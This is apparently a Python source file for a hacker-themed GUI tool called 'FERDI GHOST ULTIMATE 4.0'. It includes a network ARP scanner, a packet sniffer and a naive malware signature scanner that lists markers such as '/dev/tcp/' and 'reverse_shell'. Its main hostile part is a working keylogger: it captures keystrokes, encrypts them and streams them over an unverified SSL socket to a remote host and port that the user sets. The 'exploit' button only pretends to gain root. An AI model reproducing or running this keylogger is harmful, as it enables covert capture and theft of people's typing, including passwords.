import os
import sys
import time
import socket
import ssl
import threading
import concurrent.futures
import subprocess
from pynput import keyboard
import scapy.all as scapy
from PyQt5.QtWidgets import (
    QApplication,
    QWidget,
    QPushButton,
    QVBoxLayout,
    QLabel,
    QTextEdit,
    QHBoxLayout,
    QFileDialog,
    QLineEdit,
    QGroupBox,
    QProgressBar,
)
from PyQt5.QtGui import QFont
from PyQt5.QtCore import Qt
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes


BANNER_ASCII = r"""
███████╗███████╗██████╗ ███████╗██╗ ██████╗ ███████╗
██╔════╝██╔════╝██╔══██╗██╔════╝██║██╔═══██╗██╔════╝
█████╗  █████╗  ██████╔╝█████╗  ██║██║   ██║███████╗
██╔══╝  ██╔══╝  ██╔═══╝ ██╔══╝  ██║██║   ██║╚════██║
██║     ███████╗██║     ███████╗██║╚██████╔╝███████║
╚═╝     ╚══════╝╚═╝     ╚══════╝╚═╝ ╚═════╝ ╚══════╝
"""

SIGNATURES = {
    "RAT": [b"socket.connect", b"reverse_shell"],
    "BACKDOOR": [b"/dev/tcp/", b"nohup"],
    "VIRUS": [b"mov eax", b"jmp", b"xor"],
    "KEYLOGGER": [b"keylogger", b"keyboard_hook"],
    "CRYPTOMINER": [b"cryptonight", b"xmr-stak"],
}


class FerdiGhost(QWidget):
    def __init__(self):
        super().__init__()
        # Target & state
        self.target_ip = "192.168.1.1"
        self.target_port = 4444
        self.is_keylogging = False
        self.is_sniffing = False
        self.packet_count = 0
        self.crypto_key = get_random_bytes(32)
        self.socket = None
        self.listener = None

        self.init_ui()

    def init_ui(self):
        self.setWindowTitle("FERDI GHOST ULTIMATE 4.0")
        self.setFixedSize(1200, 800)
        self.setStyleSheet("background-color: black; color: #00ff66;")
        self.setFont(QFont("Courier New", 10))

        layout = QVBoxLayout()

        # Banner
        self.banner = QLabel(BANNER_ASCII)
        self.banner.setAlignment(Qt.AlignCenter)
        layout.addWidget(self.banner)

        # Target config
        config_group = QGroupBox("Target Configuration")
        config_layout = QHBoxLayout()
        self.ip_input = QLineEdit(self.target_ip)
        self.port_input = QLineEdit(str(self.target_port))
        config_layout.addWidget(QLabel("Target IP:"))
        config_layout.addWidget(self.ip_input)
        config_layout.addWidget(QLabel("Port:"))
        config_layout.addWidget(self.port_input)
        config_group.setLayout(config_layout)
        layout.addWidget(config_group)

        # Output console
        self.output = QTextEdit()
        self.output.setReadOnly(True)
        self.output.setStyleSheet("background-color: black; border: 1px solid #00ff66;")
        layout.addWidget(self.output)

        # Progress bar
        self.progress = QProgressBar()
        layout.addWidget(self.progress)

        # Buttons
        btn_layout = QHBoxLayout()

        # Normal buttons
        normal_buttons = [
            ("Scan File", self.scan_file_action),
            ("Scan Folder", self.scan_folder_action),
            ("Network Scan", self.network_scan),
            ("Run Exploit", self.run_exploit),
            ("Encrypt File", self.encrypt_file_action),
            ("Decrypt File", self.decrypt_file_action),
            ("Clear Logs", self.clear_logs),
        ]
        for text, func in normal_buttons:
            btn = QPushButton(text)
            btn.setStyleSheet("background-color: #111; color: #00ff66; padding: 8px;")
            btn.clicked.connect(func)
            btn_layout.addWidget(btn)

        # Toggle Keylogger button
        self.keylogger_btn = QPushButton("Start Keylogger")
        self.keylogger_btn.setStyleSheet("background-color: #111; color: #00ff66; padding: 8px;")
        self.keylogger_btn.clicked.connect(self.toggle_keylogger)
        btn_layout.addWidget(self.keylogger_btn)

        # Toggle Sniffer button
        self.sniffer_btn = QPushButton("Start Sniffer")
        self.sniffer_btn.setStyleSheet("background-color: #111; color: #00ff66; padding: 8px;")
        self.sniffer_btn.clicked.connect(self.toggle_sniffer)
        btn_layout.addWidget(self.sniffer_btn)

        layout.addLayout(btn_layout)
        self.setLayout(layout)

    # -------------------------- Network & Sniffer --------------------------
    def network_scan(self):
        self.output.append("[+] Starting network scan...")
        try:
            ans, _ = scapy.arping(self.target_ip + "/24", verbose=False)
            for sent, received in ans:
                self.output.append(f"[+] Host Alive: {received.psrc} - {received.hwsrc}")
        except Exception as e:
            self.output.append(f"[-] Scan failed: {str(e)}")

    def toggle_sniffer(self):
        if self.is_sniffing:
            self.is_sniffing = False
            self.sniffer_btn.setText("Start Sniffer")
            self.output.append("[+] Sniffer stopped")
        else:
            self.is_sniffing = True
            self.sniffer_btn.setText("Stop Sniffer")
            self.output.append("[+] Sniffer started (100 packets max)")
            threading.Thread(target=self.packet_sniffer, daemon=True).start()

    def packet_sniffer(self):
        def packet_callback(packet):
            if not self.is_sniffing or self.packet_count >= 100:
                return True
            if packet.haslayer(scapy.IP):
                self.packet_count += 1
                self.output.append(f"[Packet {self.packet_count}] {packet.summary()}")

        scapy.sniff(
            prn=packet_callback,
            store=0,
            filter="ip",
            stop_filter=lambda x: not self.is_sniffing,
        )

    # -------------------------- Exploit --------------------------
    def run_exploit(self):
        self.output.append("[+] Running simulated exploit...")
        try:
            result = subprocess.check_output("whoami", shell=True)
            self.output.append(f"[+] Current user: {result.decode().strip()}")
            self.output.append("[+] Attempting privilege escalation...")
            time.sleep(1)
            self.output.append("[+] Got root! (simulated)")
        except Exception as e:
            self.output.append(f"[-] Exploit failed: {str(e)}")

    # -------------------------- Keylogger --------------------------
    def toggle_keylogger(self):
        if self.is_keylogging:
            self.stop_keylogger()
            self.keylogger_btn.setText("Start Keylogger")
        else:
            self.start_keylogger()
            self.keylogger_btn.setText("Stop Keylogger")

    def start_keylogger(self):
        self.target_ip = self.ip_input.text()
        self.target_port = int(self.port_input.text())
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket = context.wrap_socket(raw_socket, server_hostname=self.target_ip)
            self.socket.connect((self.target_ip, self.target_port))

            def on_press(key):
                try:
                    char = key.char if hasattr(key, "char") else f"[{key}]"
                    cipher = AES.new(self.crypto_key, AES.MODE_GCM)
                    ciphertext, tag = cipher.encrypt_and_digest(char.encode())
                    encrypted_data = cipher.nonce + tag + ciphertext
                    self.socket.sendall(encrypted_data)
                except Exception as e:
                    self.output.append(f"[-] Keylogger error: {str(e)}")
                    return False

            self.listener = keyboard.Listener(on_press=on_press)
            self.listener.start()
            self.is_keylogging = True
            self.output.append(f"[+] Keylogger active (SSL+AES) -> {self.target_ip}:{self.target_port}")
        except Exception as e:
            self.output.append(f"[-] Keylogger failed: {str(e)}")

    def stop_keylogger(self):
        if self.listener:
            self.listener.stop()
            self.listener.join()
        if self.socket:
            self.socket.close()
        self.is_keylogging = False
        self.output.append("[+] Keylogger stopped")

    # -------------------------- Encryption --------------------------
    def encrypt_file_action(self):
        path, _ = QFileDialog.getOpenFileName(self, "Select File to Encrypt")
        if not path:
            return
        try:
            key = get_random_bytes(32)
            cipher = AES.new(key, AES.MODE_GCM)
            with open(path, "rb") as f:
                plaintext = f.read()
            ciphertext, tag = cipher.encrypt_and_digest(plaintext)
            with open(path + ".ghost", "wb") as f:
                f.write(cipher.nonce + tag + ciphertext)
            with open(path + ".key", "wb") as f:
                f.write(key)
            self.output.append(f"[+] File encrypted: {path}.ghost")
            self.output.append(f"[!] KEY SAVED TO: {path}.key - KEEP THIS SAFE!")
        except Exception as e:
            self.output.append(f"[-] Encryption failed: {str(e)}")

    def decrypt_file_action(self):
        path, _ = QFileDialog.getOpenFileName(self, "Select File to Decrypt")
        if not path or not path.endswith(".ghost"):
            self.output.append("[-] Only .ghost files can be decrypted!")
            return
        key_path = path[:-6] + ".key"
        if not os.path.exists(key_path):
            self.output.append("[-] Key file not found!")
            return
        try:
            with open(key_path, "rb") as f:
                key = f.read()
            with open(path, "rb") as f:
                data = f.read()
                nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            plaintext = cipher.decrypt_and_verify(ciphertext, tag)
            output_path = path[:-6] + ".decrypted"
            with open(output_path, "wb") as f:
                f.write(plaintext)
            self.output.append(f"[+] File decrypted: {output_path}")
        except Exception as e:
            self.output.append(f"[-] Decryption failed: {str(e)}")

    # -------------------------- Scan Files --------------------------
    def scan_file(self, path):
        try:
            with open(path, "rb") as f:
                data = f.read()
                results = []
                for family, sigs in SIGNATURES.items():
                    for sig in sigs:
                        if sig in data:
                            results.append(family)
                if results:
                    return f"[!] MALICIOUS ({'|'.join(results)}) {path}"
                elif data[:2] == b"MZ":
                    return f"[?] POTENTIAL (Executable) {path}"
                else:
                    return f"[+] CLEAN {path}"
        except Exception as e:
            return f"[-] ERROR {path}: {str(e)}"

    def scan_file_action(self):
        path, _ = QFileDialog.getOpenFileName(self, "Select File")
        if path:
            self.output.append(self.scan_file(path))

    def scan_folder_action(self):
        path = QFileDialog.getExistingDirectory(self, "Select Folder")
        if not path:
            return
        self.output.append(f"[+] Scanning folder: {path}")
        self.progress.setValue(0)
        files = [os.path.join(root, f) for root, _, fs in os.walk(path) for f in fs]
        total_files = len(files)
        infected = 0
        with concurrent.futures.ThreadPoolExecutor() as executor:
            futures = {executor.submit(self.scan_file, f): f for f in files}
            for i, future in enumerate(concurrent.futures.as_completed(futures)):
                result = future.result()
                if "MALICIOUS" in result:
                    infected += 1
                self.output.append(result)
                self.progress.setValue(int((i + 1) / total_files * 100))
                QApplication.processEvents()
        self.output.append(f"[+] Scan complete: {total_files} files, {infected} threats")

    # -------------------------- Utilities --------------------------
    def clear_logs(self):
        self.output.clear()


if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = FerdiGhost()
    window.show()
    sys.exit(app.exec_())
